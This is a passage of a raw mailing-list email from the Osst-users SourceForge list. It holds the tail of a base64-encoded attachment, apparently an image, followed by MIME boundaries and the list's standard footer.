3ddb7sfuKf1HD9t/z8DqL38iPJO7rrfdj9xP1HD9t/z8DqL38h5KHddb7sfuJ+o4ftv+fgdR
e/kR5KXddb7sfuKf1FD9vn8DqL4uQ8lLuut92P3E/UUODn8DqL4uRHkqd1xvux+4n6ihwc/g
dRfFyI8lZ6433Y/cU/qKHBz+B1F8XIeSs9cb7sfuJ+oYcHP4HUXxciPJYeuN92P3FP6hhwc/
gdQfFyHktPXG+7n7ifqGHBz+CeoPiI8lx6433c/cT9QQ4OfwOoPi5EeS49cb7ufuJ+oIcHP4
HUHv5DyXnrjfdz9xT+oIcHP4HUHxciPJgeuN93P3E7fhwc/gdQfFyHkwPXG+7n7idvw4OfwO
oPi5EeTE9cb7ufuKe34cHP4HUHxciPJkeuN93P3E7fhwc/gdQfFyHkyPXG+7n7idvw4OfwOo
Pi5DyZHrjfdz9xO34cHP4HUHxch5Mj1xvu5+4nb8ODn8DqD4uQ8mR6433c/cTt+HBz+B1B8X
IeTI9cb7ufuJ2/Dg5/A6g+LkPJkett93P3E7fhwc/gdQfFyNiyO5P2wTiUOdaZxUMIZmxx1F
C6lTppUVJ1rBXv616uhowwTz2/y8kj3ChCh/nNl0XVYhBC2PEipcdrjit7Z2yt6Kp/z5lGtU
6SbkdxWjEEBBChrEEZg2Dgo1I7icWMwbBwTUjuGLGYNg4JqR3DFjMGwcE1I7hixmDYOCakdw
xYzBsHBNSO4YjMGwcE1I7hiMwbBwTVW4YsZg2DgE1I7hiMwbBwTVjuIxYzBsHBNVbhixmDYO
CasdwxYzBsHAJqrcTixmDYOCaq3DFjMGwcE1VuIxYzBsHBNVbhixzY2DgmqtwxY5sbBwCaq3
DFjmxsHAJqrcMWObGwcAmqtwxY5sbBwCaq3DFjmxsHAJqrcMWObGwcAmqtwxY5sbBwCaq3DF
kgUwUpYAlSAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAg
CAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCA
IAgCAIAgCAIAgP/Z

------=_NextPart_000_0012_DFE78D2B.F52ED73E--


--===============6855534172323742992==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6855534172323742992==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============6855534172323742992==--

